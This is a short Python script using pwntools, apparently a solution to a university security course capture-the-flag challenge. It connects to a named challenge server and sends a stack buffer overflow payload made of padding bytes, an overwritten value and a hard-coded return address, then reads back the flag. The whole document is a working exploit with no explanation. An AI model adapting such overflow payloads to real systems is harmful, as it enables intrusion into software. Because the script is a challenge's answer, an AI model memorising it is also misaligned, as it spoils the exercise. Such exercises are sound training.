from pwn import remote, p32

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23155

remote = remote(SERVER, PORT, timeout=10000)

buffer = b"a" * 36 + p32(0x804a001) + b"a" * 4 + p32(0x080487d9)

remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof{")
print(flag.decode().split()[-1])